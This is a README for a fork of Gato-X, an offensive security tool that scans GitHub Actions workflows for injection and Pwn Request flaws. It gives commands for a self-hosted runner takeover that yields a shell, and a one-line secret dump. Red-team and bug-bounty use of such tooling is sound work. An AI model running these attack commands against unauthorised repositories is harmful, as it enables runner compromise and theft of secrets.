![Supported Python versions](https://img.shields.io/badge/python-3.10+-blue.svg)
[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)

# Gato (Github Attack TOolkit) - Extreme Edition

Gato-X is a _FAST_ scanning and attack tool for GitHub Actions pipelines. You can use it to identify
Pwn Requests, Actions Injection, TOCTOU Vulnerabilities, and Self-Hosted Runner takeover at scale using just a single API token. It will also analyze cross-repository workflows and reusable actions. This surfaces vulnerabilities that other scanners miss because they only scan workflows within a single repository.

Gato-X is an operator focused tool that is tuned to avoid false negatives. It will have a higher false positive rate than SAST tools like CodeQL, but Gato-X will give you everything you need to quickly determine if something is a true positive or not!

The `search` and `enumerate` modes are safe to run on all public repositories, and
you will not violate any rules by doing so.

Gato-X's attack features should only be used with authorization, and make sure
to follow responsible disclosure if you find vulnerabilities with Gato-X.

**Gato-X is a powerful tool and should only be used for ethical security research purposes.**

## Documentation

For comprehensive documentation, please visit the [Gato-X Documentation](https://adnanekhan.github.io/gato-x/) site.

## What is Gato-X?

Gato-X is an offensive security tool designed to identify exploitable GitHub Actions misconfigurations or privilege escalation paths. It focuses on several key areas:

* Self-Hosted Runner enumeration using static analysis of workflow files and analysis of workflow run logs
* Pwn Request and Actions Injection enumeration using static analysis
* Post-compromise secrets enumeration and exfiltration
* Public repository self-hosted runner attacks using Runner-on-Runner (RoR) technique
* Private repository self-hosted runner attacks using RoR technique

The target audience for Gato-X is Red Teamers, Bug Bounty Hunters, and Security Engineers looking to identify misconfigurations.

## Feature Highlights

### Fast and Comprehensive Scanning

Gato-X contains a powerful scanning engine for GitHub Actions vulnerabilities. It is capable of scanning 35-40 *thousand* repositories in 1-2 hours using a single GitHub PAT. Key capabilities include:

* Reachability Analysis
* Cross-Repository Transitive Workflow and Reusable Action Analysis
* Parsing and Simulation of "If Statements"
* Gate Check Detection (permission checks, etc.)
* Lightweight Source-Sink Analysis for Variables
* MCP Server

## Quick Start

### Run with Docker

```bash
docker run --rm -e GH_TOKEN ghcr.io/mr-pmillz/gato-x enumerate -t acme-corp
```

Multi-arch images (`linux/amd64`, `linux/arm64`) are published to
`ghcr.io/mr-pmillz/gato-x`. See [Docker Usage](docs/user-guide/advanced/docker.md).

Any command line option can also live in `~/.config/gato-x/config.yaml` --
see [Configuration File](docs/user-guide/advanced/configuration-file.md).


### Search For GitHub Actions Vulnerabilities at GitHub Scale

First, create a GitHub PAT with the `repo` scope. Set that PAT to the
`GH_TOKEN` environment variable.

Gato-X can also authenticate as a GitHub App with `--app-id` and `--app-key`
(or `GH_APP_ID` / `GH_APP_KEY`), in which case it mints and renews the JWT and
installation token itself, so a long run is not capped at the one-hour
installation token lifetime. See
[GitHub App Authentication](docs/user-guide/advanced/github-app-auth.md).

Next, use the search feature to retrieve a list of candidate repositories:

```
gato-x s -sg -q 'count:75000 /(issue_comment|pull_request_target|issues:)/ file:.github/workflows/ lang:yaml' -oT checks.txt
```

Finally, run Gato-X on the list of repositories:

```
gato-x e -R checks.txt | tee gatox_output.txt
```

This will take some time depending on your computer and internet connection speed. Since the results are very long, use `tee` to save them to a file
for later review. Gato-X also supports JSON output, but that is intended for further machine analysis.

### Perform Self Hosted Runner Takeover

To perform a public repository self-hosted runner takeover attack, Gato-X requires a PAT with the following scopes:

`repo`, `workflow`, and `gist`.

This should be a PAT for an account that is a _contributor_ to the target repository (i.e. submitted a typo fix).

```
gato-x a --runner-on-runner --target ORG/REPO --target-os [linux,osx,windows] --target-arch [arm,arm64,x64]
```
It is very rare that maintainers select allowing workflows on pull request from all external users without approval,
but it has happened.

Next, Gato-X will automatically prepare a C2 repository and begin the operation. Gato-X will monitor each step
as the attack continues, exiting as gracefully as possible at each phase in case of a failure. If workflow approval
is required, Gato-X will wait a short period of time before exiting.

If the full chain succeeds, Gato-X will drop to an interactive prompt. This will execute shell commands on the
self-hosted runner.

If the target runner is non-ephemeral, use the `--keep-alive` flag. This will keep the workflow running. GitHub
Actions allows workflow runs on self-hosted runners to run for up to **5 days** (as of writing, this might change - it was 30 days).

### Dump Secrets

If you have a PAT with write access to the repository along with the `repo` and `workflow` scopes, you can dump all secrets accessible to the repository with a single command:

`gato-x attack --secrets -t targetOrg/targetRepo -d`

See documentation for additional options such as specifying workflow name, branch name, and more.

## Installation

Gato supports OS X and Linux with at least **Python 3.10**.

> **Note:** This is a fork of [AdnaneKhan/gato-x](https://github.com/AdnaneKhan/gato-x)
> and is **not** on PyPI under the `gato-x` name -- `pip install gato-x` fetches
> the upstream project, not this fork.

The quickest way to run this fork is the container image:

```
docker run --rm -e GH_TOKEN ghcr.io/mr-pmillz/gato-x enumerate -t acme-corp
```

To install from source, we recommend [uv](https://github.com/astral-sh/uv),
which is also what CI uses:

```
git clone https://github.com/mr-pmillz/gato-x
cd gato-x
uv venv
uv pip install .
source .venv/bin/activate
```

Or with pip and a plain virtual environment:

```
git clone https://github.com/mr-pmillz/gato-x
cd gato-x
python3 -m venv venv
source venv/bin/activate
pip install .
```
OR You can use pipx
```
git clone https://github.com/mr-pmillz/gato-x
cd gato-x
pipx install .
```

If you need to make on-the-fly modifications, then install it in editable mode with `pip install -e`.

## Contributing

Contributions are welcome! Please [review](https://adnanekhan.github.io/gato-x/contribution-guide/contributions/) the design methodology before working on a new feature!

Additionally, if you are proposing significant changes to the tool, please open an issue to start a conversation about the motivation for the changes.

## License

Gato-X is licensed under the [Apache License, Version 2.0](LICENSE).

```
Gato-X:

Copyright 2024, Adnan Khan

Original Gato Implementation:

Copyright 2023 Praetorian Security, Inc

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at
    http://www.apache.org/licenses/LICENSE-2.0
Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
```
